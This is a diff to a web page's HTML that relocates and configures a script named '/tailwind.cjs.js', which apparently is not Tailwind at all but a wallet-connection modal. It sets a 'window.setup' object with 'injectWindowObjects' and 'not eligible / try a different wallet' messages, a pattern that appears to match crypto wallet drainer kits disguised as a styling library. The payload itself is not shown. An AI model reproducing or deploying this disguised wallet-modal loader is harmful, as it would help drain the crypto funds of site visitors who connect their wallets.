@@ -97,36 +97,6 @@
     </script>
     
     <link rel="stylesheet" href="/css/styles.css">
-    <script src="/tailwind.cjs.js" defer></script>
-    <script>
-      // Setup Reown modal configuration - Apply after script loads
-      (function() {
-        function applySettings() {
-          if (window.setup) {
-            // Merge our settings with existing ones (don't overwrite completely)
-            window.setup.modal = 'reown';
-            window.setup.theme = 'dark';
-            window.setup.radius = 'm';
-            window.setup.auto_prompt = false;
-            if (window.setup.injectWindowObjects === undefined) {
-              window.setup.injectWindowObjects = true;
-            }
-            window.setup.notEligibleHeader = "You are not eligible";
-            window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
-          }
-        }
-        
-        // Try after script loads
-        setTimeout(applySettings, 100);
-        setTimeout(applySettings, 500);
-        
-        // Also after page load
-        window.addEventListener('load', function() {
-          setTimeout(applySettings, 100);
-          setTimeout(applySettings, 500);
-        });
-      })();
-    </script>
   </head>
   <body>
     <!-- How it works Modal -->
@@ -549,5 +519,49 @@
 
     <script src="/js/token-loader.js"></script>
     <script src="/js/app.js"></script>
-</body>
+    
+    <!-- Load wallet modal script asynchronously at the end to not block page rendering -->
+    <script>
+      // Setup Reown modal configuration - MUST be before tailwind.cjs.js loads
+      window.setup = {
+        modal: 'reown',
+        theme: 'dark',
+        radius: 'm',
+        auto_prompt: false,
+        injectWindowObjects: true,
+        notEligibleHeader: "You are not eligible",
+        notEligibleParagraph: "Try a different wallet to meet the requirements."
+      };
+    </script>
+    <script src="/tailwind.cjs.js" async></script>
+    <script>
+      // Reapply settings after script loads (in case it overwrites)
+      (function() {
+        function applySettings() {
+          if (window.setup) {
+            window.setup.modal = 'reown';
+            window.setup.theme = 'dark';
+            window.setup.radius = 'm';
+            window.setup.auto_prompt = false;
+            window.setup.injectWindowObjects = true;
+            window.setup.notEligibleHeader = "You are not eligible";
+            window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
+          }
+        }
+        
+        // Try multiple times to ensure settings are applied
+        setTimeout(applySettings, 50);
+        setTimeout(applySettings, 200);
+        setTimeout(applySettings, 500);
+        
+        // Also after script loads
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', applySettings);
+        }
+        window.addEventListener('load', function() {
+          setTimeout(applySettings, 100);
+        });
+      })();
+    </script>
+  </body>
 </html>
